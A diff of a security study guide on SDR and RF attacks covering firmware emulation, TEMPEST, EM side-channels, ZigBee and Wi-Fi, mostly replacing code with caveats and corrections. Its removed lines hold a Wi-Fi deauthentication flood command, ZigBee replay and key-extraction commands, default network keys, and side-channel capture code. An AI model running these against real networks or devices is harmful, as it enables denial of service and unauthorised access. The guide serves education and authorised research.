-        return False
-    
-    mu.hook_add(UC_HOOK_MEM_INVALID, hook_mem_invalid)
-    
-    # Emulate function (address must be OR'd with 1 for Thumb)
-    try:
-        mu.emu_start(parse_func_addr | 1, parse_func_addr + 0x200, 
-                     timeout=1000000, count=10000)
-    except UcError as e:
-        print(f"[!] Unicorn error: {e}")
-    
-    return mu.reg_read(UC_ARM_REG_R0)  # Return value
-
-# AFL++ with Unicorn for automated fuzzing:
-# afl-fuzz -i corpus/ -o findings/ -- python3 unicorn_harness.py @@
-```
-
-```python
-# Qiling: higher-level firmware emulation
-from qiling import *
-from qiling.const import QL_VERBOSE
-
-def qiling_fuzz_harness(firmware_path: str, packet: bytes):
-    """
-    Qiling-based fuzzing harness for firmware packet parsers.
-    Provides OS-level emulation for more complete firmware execution.
-    """
-    ql = Qiling(
-        [firmware_path],
-        rootfs="/path/to/rootfs",
-        verbose=QL_VERBOSE.OFF
-    )
-    
-    # Write packet to memory
-    target_addr = ql.mem.search(b'\x00' * len(packet))[0]
-    ql.mem.write(target_addr, packet)
-    
-    # Hook packet receive callback
-    def on_packet_receive(ql):
-        ql.reg.r0 = target_addr
-        ql.reg.r1 = len(packet)
-    
-    ql.hook_address(on_packet_receive, RECEIVE_CALLBACK_ADDR)
-    
-    try:
-        ql.run()
-    except Exception as e:
-        print(f"[CRASH] Packet caused: {e}")
-        return packet  # Return crashing input
-    
-    return None
-```
-
----
+[Unicorn](https://github.com/unicorn-engine/unicorn) and
+[Qiling](https://github.com/qilingframework/qiling) can support controlled emulation,
+but a complete harness needs architecture, memory maps, calling convention, valid
+stack/return state, peripheral behavior, inputs and reset/termination rules.
+Neither a search for zero-filled memory nor a catch-all exception handler reliably
+identifies a target crash. Firmware with unmodeled hardware may not run faithfully.
+The former sketches are omitted rather than presented as usable harnesses.
 
 ## Bonus Topics
 
 ### Chapter 12: TEMPEST
 
-TEMPEST (a US government codename, retrospectively backronymed as *Transient Electromagnetic Pulse Emanation Standard*) refers to the unintentional emission of electromagnetic signals from electronic equipment that can be captured and analyzed to reconstruct processed information.
+TEMPEST (a name associated with compromising-emanations research and controls) refers to the unintentional emission of electromagnetic signals from electronic equipment that can be captured and analyzed to reconstruct processed information.
 
 #### The Core Concept
 
-Every electronic circuit emits RF radiation as a byproduct of operation. Rapidly switching digital signals radiate according to their frequency content. A CPU processing sensitive data, a display controller rendering an image, or a keyboard generating keystrokes - all emit characteristic RF signatures that can be received and decoded at a distance.
+Every electronic circuit emits RF radiation as a byproduct of operation. Rapidly switching digital signals radiate according to their frequency content. A CPU, display controller or keyboard may produce observable emissions. Recoverability depends on signal leakage, coupling, bandwidth, noise, synchronization and the inference task; an RF peak does not establish recovered information.
 
 ```
-Source of emission:
-  Digital circuit switching at frequency f
-  → Radiates energy at f, 2f, 3f, ... (harmonics)
-  → Radiation amplitude proportional to dI/dt (rate of current change)
-  → Radiated from PCB traces, cables, power lines (unintentional antennas)
+Potential emission paths:
+  Digital switching and signal activity
+  → Frequency components shaped by currents, geometry and coupling
+  → PCB traces, cables and power paths
+  → Measurement depends on the complete setup
 
 Attacker receives:
   Emissions on a wideband antenna near target
@@ -1707,58 +780,7 @@ CRT/LCD controller → Video cable (unintentional antenna) → Radiates sync + p
 
 **Modern implementation with SDR:**
 
-```python
-# gist.github.com/sekuryti/... (TempestSDR-style implementation)
-# TempestSDR by Martin Marinov: https://github.com/martinmarinov/TempestSDR
-
-# Basic concept:
-# 1. Identify display's horizontal sync frequency (pixel clock / pixels_per_line)
-# 2. IQ samples collected at that rate produce one "pixel" per sample
-# 3. Reshape samples into (height x width) image
-# 4. Apply image processing (deblur, color decode)
-
-def reconstruct_display(iq_samples, sample_rate, 
-                          h_sync_freq, width_pixels, height_pixels):
-    """
-    Attempt display reconstruction from TEMPEST emissions.
-    h_sync_freq: horizontal sync frequency in Hz
-    """
-    import numpy as np
-    from PIL import Image
-    
-    # Samples per line
-    samples_per_line = int(sample_rate / h_sync_freq)
-    
-    # Total samples for one frame
-    samples_per_frame = samples_per_line * height_pixels
-    
-    if len(iq_samples) < samples_per_frame:
-        print("Not enough samples for one frame")
-        return None
-    
-    # Take one frame worth of samples
-    frame_samples = iq_samples[:samples_per_frame]
-    
-    # Demodulate (use magnitude for simple case)
-    intensity = np.abs(frame_samples)
-    
-    # Reshape to 2D image
-    # Note: actual width in samples may differ from pixel count
-    # (includes blanking intervals)
-    try:
-        image_data = intensity.reshape(height_pixels, samples_per_line)
-        
-        # Normalize
-        image_data = (image_data - image_data.min()) / (image_data.max() - image_data.min())
-        
-        # Convert to uint8
-        image_data = (image_data * 255).astype(np.uint8)
-        
-        return Image.fromarray(image_data, mode='L')
-    except ValueError as e:
-        print(f"Reshape error: {e}")
-        return None
-```
+The previous magnitude-and-reshape function did not recover synchronization, blanking, drift or color and was not a general display reconstruction algorithm. Compare the [TempestSDR implementation](https://github.com/martinmarinov/TempestSDR) and use only authorized captures with independently known test content.
 
 #### TEMPEST Attack Surface Expansion
 
@@ -1768,9 +790,9 @@ def reconstruct_display(iq_samples, sample_rate,
 | **Keyboard** | Keystroke timing via EM pulse | Correlate pulse timing with key timing |
 | **CPU cache** | Power/EM correlates with computation | EM side-channel (see Chapter 13) |
 | **Crypto accelerator** | Power varies with key data | Power/EM analysis |
-| **LED status lights** | Optical emission of traffic data | Optical TEMPEST; "Lamphone" attack |
+| **LED status lights** | Optical emission of traffic data | Optical TEMPEST; optical side-channel studies |
 | **Power line** | Conducted emission on AC power | Power line analysis |
-| **USB cable** | USB 3.0 radiation at 5 GHz | USB TEMPEST |
+| **USB cable** | Broadband emissions depending on interface generation and wiring | Device-specific measurement and inference |
 
 #### TEMPEST Countermeasures
 
@@ -1779,34 +801,33 @@ def reconstruct_display(iq_samples, sample_rate,
 | **Faraday shielding** | Contains EM emissions within enclosure |
 | **Tempest-rated equipment** | Designed to minimize unintentional emissions |
 | **EMSEC filtering** | Power line and signal line filtering |
-| **Physical separation** | Distance reduces received signal strength (inverse square) |
-| **Noise injection** | Inject wideband noise to mask emissions |
+| **Physical separation** | Distance can reduce coupling; near-field and enclosure behavior require measurement |
+| **Noise / masking countermeasures** | Require measured effectiveness and appropriate emissions authority |
 | **Spread-spectrum clocking** | Spreads clock harmonics; reduces peak emission amplitude |
 
 ---
 
 ### Chapter 13: EM Side-Channel Attacks
 
-EM side-channel attacks are a higher-resolution variant of TEMPEST: using a near-field probe placed close to the target IC to measure EM emissions that correlate with the data being processed.
+![Observed EM emissions require controlled acquisition, a leakage model and independent validation before secret-recovery claims](../assets/diagrams/advanced-sdr-em-inference.svg)
 
-Unlike far-field TEMPEST (meters of distance), EM side-channel work typically requires the probe within millimeters of the target chip. This is the intersection of hardware hacking (Chapter 3 of the Hardware Hacking section) and SDR/RF signal capture.
+*Figure 4 — Original conceptual evidence chain; no trace or recovered secret is depicted. Compare [NinjaLab's EUCLEAK research](https://ninjalab.io/eucleak/) for a specific physical side-channel demonstration, not a universal receiver recipe.*
+
+EM side-channel analysis is related to compromising-emanations research but has a distinct inference goal: using a near-field probe placed close to the target IC to measure EM emissions that correlate with the data being processed.
+
+Near-field probe placement is common, but neither these research areas nor attainable distances are defined by one universal separation. This is the intersection of hardware hacking (Chapter 3 of the Hardware Hacking section) and SDR/RF signal capture.
 
 #### EM Probe Construction
 
-A simple single-turn loop probe made from coax is sufficient for most near-field EM capture:
+Probe sensitivity, geometry, bandwidth, loading and position must match the target and acquisition setup. A simple loop is not sufficient for every measurement:
 
 ```
-Coax-based EM probe:
-  Cut coax 5 cm from end
-  Strip outer jacket 2 cm → expose shield
-  Form shield into a loop (1–2 cm diameter)
-  Solder loop ends together
-  Connect to SDR input via SMA
-
-For higher sensitivity:
-  Hand-wound 5-10 turn air-core coil (2 cm diameter)
-  Connect to low-noise amplifier → SDR
-  Position coil perpendicularly to chip surface
+Probe-selection considerations:
+  Target frequency content and bandwidth
+  Probe transfer characteristics and loading
+  Orientation, position and repeatability
+  Frontend input limits and amplification
+  Trigger alignment and negative controls
 ```
 
 **Commercial probes:** Langer EMV probes (IC series) are purpose-built for near-field IC measurement. Riscure also produces EM probes for security research.
@@ -1816,169 +837,48 @@ For higher sensitivity:
 | Aspect | Power Analysis | EM Side-Channel |
 |--------|---------------|----------------|
 | **Access required** | Shunt resistor in VCC path | Near-field probe near IC |
-| **Trace quality** | Higher SNR (direct measurement) | Lower SNR; position-dependent |
+| **Trace quality** | Setup- and target-dependent | Setup-, probe- and position-dependent |
 | **Spatial selectivity** | Whole chip | Can target specific circuit regions |
-| **Required access** | Need to modify board | Non-invasive; probe placement only |
+| **Required access** | Depends on accessible supply path | May require opening an enclosure or preparing the target |
 | **Multi-channel** | Single global supply | Different probes at different locations |
 
 #### EM-DPA Workflow
 
-The analysis methodology mirrors the power analysis DPA covered in the Hardware Hacking section, with EM trace substituted for power traces:
+The analysis methodology mirrors the power analysis DPA covered in the Hardware Hacking section, with an appropriate leakage model and synchronized EM traces:
 
-```python
-# EM trace collection using SDR
-# 1. Position probe above target chip (usually near crypto accelerator)
-# 2. Trigger acquisition on target's "start crypto" signal (GPIO or UART)
-# 3. Capture a window of EM emission synchronized to crypto operation
-# 4. Repeat for N plaintexts
+A generic RTL-SDR read started in a Python thread does not establish deterministic trigger alignment. Define acquisition timing, bandwidth, gain, probe location, trace integrity and known inputs before making leakage claims. A default 100 MHz tuner setting is not DC coupling, and the strongest FFT bin need not be a cryptographic emission.
 
-from rtlsdr import RtlSdr
-import numpy as np
-
-class EMTraceCollector:
-    def __init__(self, center_freq=None, sample_rate=2.4e6, gain=49):
-        """
-        center_freq: frequency of dominant EM emission from target
-                     (find via spectrum sweep while target is running crypto)
-        """
-        self.sdr = RtlSdr()
-        self.sdr.sample_rate = sample_rate
-        self.sdr.gain = gain
-        
-        if center_freq:
-            self.sdr.center_freq = center_freq
-        else:
-            # Default: DC-coupled; capture at low freq where most MCU emissions land
-            self.sdr.center_freq = 100e6  # Adjust based on target's clock frequency
-    
-    def find_emission_frequency(self, duration_s=5):
-        """
-        Capture spectrum while target runs crypto; find peak emission.
-        """
-        n_samples = int(self.sdr.sample_rate * duration_s)
-        print(f"Collecting {n_samples} samples for frequency identification...")
-        samples = self.sdr.read_samples(n_samples)
-        
-        # FFT
-        from scipy.fft import fft, fftfreq, fftshift
-        N = min(len(samples), 8192)
-        spectrum = np.abs(fftshift(fft(samples[:N])))
-        freqs = fftshift(fftfreq(N, 1/self.sdr.sample_rate))
-        
-        # Find peak
-        peak_idx = np.argmax(spectrum)
-        peak_freq = self.sdr.center_freq + freqs[peak_idx]
-        print(f"Strongest emission at: {peak_freq/1e6:.3f} MHz")
-        return peak_freq
-    
-    def collect_trace(self, n_trace_samples=10000, trigger_fn=None):
-        """
-        Collect a single EM trace.
-        trigger_fn: optional callable; blocks until trigger condition met
-        """
-        if trigger_fn:
-            trigger_fn()  # Wait for trigger (e.g., send encrypt command over UART)
-        
-        samples = self.sdr.read_samples(n_trace_samples)
-        
-        # Demodulate: use magnitude for power-like trace
-        trace = np.abs(samples)
-        return trace
-    
-    def collect_traces(self, n_traces, plaintexts, encrypt_fn):
-        """
-        Collect N traces for DPA.
-        encrypt_fn(plaintext) → triggers encryption on target and returns ciphertext
-        """
-        traces = np.zeros((n_traces, 10000))  # Adjust trace length
-        
-        for i in range(n_traces):
-            pt = plaintexts[i]
-            
-            # Start collection thread, then trigger encrypt
-            import threading
-            result = [None]
-            
-            def collect():
-                result[0] = self.collect_trace(trigger_fn=None)
-            
-            t = threading.Thread(target=collect)
-            t.start()
-            
-            # Send encrypt command while collecting
-            ct = encrypt_fn(pt)
-            t.join(timeout=1.0)
-            
-            if result[0] is not None:
-                traces[i] = result[0]
-            
-            if i % 100 == 0:
-                print(f"Collected {i}/{n_traces}")
-        
-        return traces
-```
-
-After collection, apply DPA/CPA analysis from the Hardware Hacking section - the math is identical; only the measurement source differs.
+Use the [hardware side-channel guide](../HardwareHacking/Chapter4.md) for analysis principles. Acquisition, alignment, leakage models and validation must fit the physical measurement; starting a host thread does not provide a hardware-synchronized trigger.
 
 ---
 
 ### Chapter 14: ZigBee
 
-ZigBee is the most common IoT/smart home wireless protocol. Built on IEEE 802.15.4, it operates at 2.4 GHz (globally), 868 MHz (Europe), and 915 MHz (US).
+Zigbee is based on IEEE 802.15.4. The common 2.4 GHz PHY uses O-QPSK with DSSS; regional and older PHY options differ. Check the actual product and security version.
 
 #### ZigBee Attack Surface
 
-| Attack | Description | Tool |
-|--------|-------------|------|
-| **Passive sniffing** | Capture unencrypted ZigBee traffic | Ubertooth, CC2531 USB dongle, KillerBee |
-| **Key extraction** | Capture initial key transport or obtain well-known key | KillerBee |
-| **Replay attack** | Re-transmit captured commands | KillerBee + custom tools |
-| **Packet injection** | Inject crafted IEEE 802.15.4 frames | YARD Stick One, KillerBee |
-| **Trust Center attack** | Impersonate trust center during key exchange | Specialized tools |
-| **Denial of service** | Jam 2.4 GHz or flood with 802.15.4 beacon frames | YARD Stick One, HackRF |
+Use a supported IEEE 802.15.4 capture interface and matching firmware; follow the
+[KillerBee hardware and tool documentation](https://github.com/riverloopsec/killerbee).
+YARD Stick One operates below 1 GHz and is not a 2.4 GHz Zigbee capture or injection
+adapter. See [its manufacturer specifications](https://greatscottgadgets.com/yardstickone/).
+Do not substitute a Bluetooth-focused tool merely because it also uses 2.4 GHz.
 
 #### KillerBee Toolkit
 
-```bash
-# Install KillerBee
-pip install killerbee
-# Requires: CC2531 USB dongle flashed with packet sniffer firmware
-# or ATMEL RZ RAVEN USB Stick
-# or YARD Stick One
-
-# Scan for ZigBee networks
-zbfind -i /dev/ttyUSB0
-
-# Passive capture
-zbdump -i /dev/ttyUSB0 -c 11 -w capture.pcap  # Channel 11 = 2.405 GHz
-
-# Replay captured frame
-zbreplay -i /dev/ttyUSB0 -c 11 -r capture.pcap
-
-# Extract network key from capture (if key transport visible)
-zbkey -r capture.pcap
-
-# Decode captured traffic in Wireshark
-# Wireshark supports ZigBee with key configured: Edit → Preferences → Protocols → ZigBee
-```
+Select installation and interface options for the exact supported release and board.
+A packet capture, decryption with authorized keys, injection and receiver acceptance
+are separate operations. The former generic serial-device commands were not
+validated for a particular adapter or release.
 
 #### ZigBee Key Management Weaknesses
 
-```
-Join process:
-  New device → [Association Request] → Coordinator
-  Coordinator → [Association Response] → New device
-  Coordinator → [Transport Key (NWK Key)] → New device   ← Key sent in cleartext
-                                                              on first join!
-
-Default/well-known keys:
-  ZigBee default trust center key: 0x5A6967426565416C6C69616E636530
-  Hue bridge default ZLL key:      0x451234567890ABCDEF456789ABCDEF01
-  
-Many installations never change from default keys.
-```
-
----
+The original text incorrectly implied a universal cleartext first-join key transfer.
+Zigbee commissioning and trust-center behavior depend on version, security mode and
+provisioning. A known or exposed transport key in a particular configuration is not
+equivalent to every network transmitting its key in the clear. The unverified
+hardcoded example key strings are removed. Review the actual commissioning settings,
+key update policy and device behavior using an authorized test network.
 
 ### Chapter 15: Wi-Fi RF Security
 
@@ -1988,94 +888,29 @@ Beyond standard 802.11 protocol attacks (WPA2 cracking, PMKID, evil twin - cover
 
 **Management frame injection:**
 
-```bash
-# Classic: deauthentication flood using Aircrack-ng suite
-# (requires monitor-mode capable Wi-Fi adapter, not SDR)
-airmon-ng start wlan0
-aireplay-ng -0 0 -a [AP_BSSID] -c [CLIENT_MAC] wlan0mon
-```
+Management-frame behavior depends on the PHY, firmware, client and negotiated protections. Use supported capture tooling to inspect the actual exchange; this guide does not provide a validated injection sequence.
 
 **OFDM pilot tone analysis:**
 
-Every 802.11 OFDM frame contains pilot subcarriers - known reference tones at fixed subcarrier positions. These can be used for:
+Legacy OFDM PHYs and later OFDM-based variants have defined pilot subcarriers; layouts and numerology differ. The legacy 64-point example is not universal. Pilot information consists of known reference tones at specified subcarrier positions. With suitable synchronization, it can support:
 
 - **Device fingerprinting:** Slight frequency and phase offset patterns in pilot tones are hardware-specific
 - **Channel estimation:** Reconstruct the multipath channel for signal processing
-- **Carrier frequency offset (CFO) measurement:** Each device has a unique CFO signature
+- **Carrier frequency offset (CFO) measurement:** CFO can vary with oscillator, temperature, receiver and time; it is not a unique identity
 
-```python
-# Wi-Fi device fingerprinting from pilot tone analysis
-# Requires full IQ capture of 802.11 frames (HackRF or USRP)
-
-def extract_pilot_cfo(iq_frame, fft_size=64, cp_length=16):
-    """
-    Extract carrier frequency offset from 802.11 OFDM pilot tones.
-    802.11 pilot subcarriers: -21, -7, +7, +21 (BPSK pilots)
-    """
-    # Remove cyclic prefix
-    symbol = iq_frame[cp_length:cp_length + fft_size]
-    
-    # FFT
-    spectrum = np.fft.fft(symbol, n=fft_size)
-    
-    # Pilot subcarrier indices (in 64-point FFT, centered at DC)
-    # -21 mod 64 = 43, -7 mod 64 = 57, +7 = 7, +21 = 21
-    pilot_indices = [43, 57, 7, 21]
-    pilot_known = [1, 1, 1, -1]  # Known BPSK pilot values
-    
-    # Measure phase of each pilot
-    pilot_phases = []
-    for idx, expected in zip(pilot_indices, pilot_known):
-        pilot = spectrum[idx]
-        # Remove known pilot value rotation
-        corrected = pilot * expected
-        pilot_phases.append(np.angle(corrected))
-    
-    # CFO estimate from linear phase slope across pilot positions
-    # (simplified - full CFO estimation is more complex)
-    phase_diff = np.mean(np.diff(sorted(pilot_phases)))
-    cfo_estimate = phase_diff * (64 / (2 * np.pi * 1e-7))  # Rough Hz estimate
-    
-    return cfo_estimate, pilot_phases
-```
+Pilot phase differences across frequency are affected by channel delay and sampling alignment. Carrier offset estimation needs an appropriate time-domain or inter-symbol model, synchronization and pilot polarity handling. The former spatial-phase-slope formula was not a valid general CFO estimator and is omitted.
 
 **RSSI-based localization:**
 
-```python
-# Wi-Fi location estimation from RSSI measurements
-# Not strictly SDR but directly relevant to RF security
-
-import numpy as np
-from scipy.optimize import minimize
-
-def rssi_to_distance(rssi_dbm, path_loss_exp=3.0, rssi_at_1m=-40):
-    """Convert RSSI to estimated distance (meters)"""
-    return 10 ** ((rssi_at_1m - rssi_dbm) / (10 * path_loss_exp))
-
-def trilaterate(ap_positions, distances):
-    """
-    Estimate device position from distances to multiple APs.
-    ap_positions: list of (x, y) AP coordinates
-    distances: list of estimated distances to each AP
-    """
-    def residuals(pos):
-        x, y = pos
-        return sum(
-            (np.sqrt((x-px)**2 + (y-py)**2) - d)**2
-            for (px, py), d in zip(ap_positions, distances)
-        )
-    
-    x0 = np.mean([p[0] for p in ap_positions])
-    y0 = np.mean([p[1] for p in ap_positions])
-    result = minimize(residuals, [x0, y0], method='Nelder-Mead')
-    return result.x
-```
+RSSI-to-distance inversion is a calibrated propagation model, not a direct range measurement. Multipath, antenna patterns, unknown transmit power and obstacles can dominate the estimate. Report uncertainty and independently measured ground truth; an optimizer result alone does not establish location.
 
 ---
 
 ## Quick Reference
 
 ### Signal Identification Cheatsheet
+
+These are candidate visual cues only. Bandwidth, display settings and channel effects can produce similar shapes across unrelated signals; no row identifies a protocol or security result by itself.
 
 ```
 Bandwidth    Shape           Behavior      → Most Likely
@@ -2096,30 +931,32 @@ Wide flat    Noise-like      Constant       DSSS (GPS, 802.11b, etc.)
 
 | Protocol | Frequency | Modulation | Symbol Rate | Key Tool |
 |----------|-----------|-----------|------------|---------|
-| LoRa EU | 868 MHz | CSS (chirp) | SF-dependent | gr-lora, ChirpStack |
-| LoRa US | 915 MHz | CSS | SF-dependent | gr-lora |
-| ZigBee | 2.405–2.480 GHz | O-QPSK | 250 kbps | KillerBee |
+| LoRa regional example | Region- and device-dependent | CSS (chirp) | Bandwidth / SF-dependent | Compatible decoder; server is a separate layer |
+| LoRaWAN | Regional channel plan | Uses supported LoRa PHY settings | Version-dependent | Compatible gateway and network server |
+| Common 2.4 GHz Zigbee PHY | 2.405–2.480 GHz | O-QPSK / DSSS | 250 kbit/s data; 62.5 ksymbol/s | Supported 802.15.4 interface |
 | 433 ISM OOK | 433.92 MHz | OOK | 1–10 kbps | rtl_433, URH |
 | KeeLoq | 315/433 MHz | OOK | ~5 kbps | URH + custom |
-| nRF24 (ShockBurst) | 2.4–2.525 GHz | GFSK | 250k/1M/2Mbps | mousejack tools |
-| CC1101 default | 433.92 MHz | FSK/OOK | Configurable | URH, GNU Radio |
+| nRF24 family | Part- and region-dependent 2.4 GHz channels | GFSK | Exact-part dependent | Version-matched packet tooling |
+| CC1101 configuration | Supported disjoint sub-GHz bands | Supported FSK/ASK/OOK families | Configuration-dependent | Compatible frontend tooling |
 
 ### Exploitation Framework Selection
 
 | Scenario | Tool | Why |
 |----------|------|-----|
 | Unknown ISM signal | URH + inspectrum | Best for visual RE + bit extraction |
-| Known 200+ protocols | rtl_433 | Auto-identifies most consumer devices |
+| Supported telemetry protocols | rtl_433 | Decoder-specific fields; unsupported signals may remain unidentified |
 | Custom protocol fuzz | GNU Radio + Python fuzzer | Flexible; scriptable |
 | Firmware RE | Ghidra + SVD-Loader | Best static analysis for embedded |
-| LoRa stack attack | ChirpStack + gr-lora | Full protocol stack visibility |
+| LoRa stack attack | ChirpStack + gr-lora | Version-matched gateway/server context, not arbitrary IQ decoding |
 | ZigBee attack | KillerBee | Purpose-built; mature |
-| Firmware emulation fuzz | Unicorn + AFL++ | No hardware needed |
-| EM side-channel | RTL-SDR/SDR + near-field probe | Low cost entry |
+| Offline parser testing | Version-matched emulator/harness | Peripheral and timing models may be incomplete |
+| EM side-channel | RTL-SDR/SDR + near-field probe | Hardware and synchronization must match the leakage question |
 
 ---
 
 ## Further Reading
+
+**Review boundaries:** The four figures are original static teaching diagrams. The review corrected modulation/encoding attribution, receiver/tool capabilities, LoRaWAN integrity and key-handling claims, source/sink wiring, metadata handling, and unsupported firmware/EM/ML formulas. Unvalidated executable sketches were replaced with explicit implementation boundaries. No hardware or exploit reproduction is claimed.
 
 **Papers and Research:**
 - Van Eck, W. (1985) - *Electromagnetic Radiation from Video Display Units: An Eavesdropping Risk* (original TEMPEST paper)
@@ -2154,4 +991,4 @@ Wide flat    Noise-like      Constant       DSSS (GPS, 802.11b, etc.)
 
 ---
 
-*Companion guide to the hardwear.io advanced SDR training curriculum. Maintained as part of the ULTIMATE-CYBERSECURITY-MASTER-GUIDE. All techniques are for authorized security research and CTF use only.*
+*Independent repository study guide referencing advanced SDR training topics; not a verified reproduction of that curriculum. Maintained as part of the ULTIMATE-CYBERSECURITY-MASTER-GUIDE. All techniques are for authorized security research and CTF use only.*
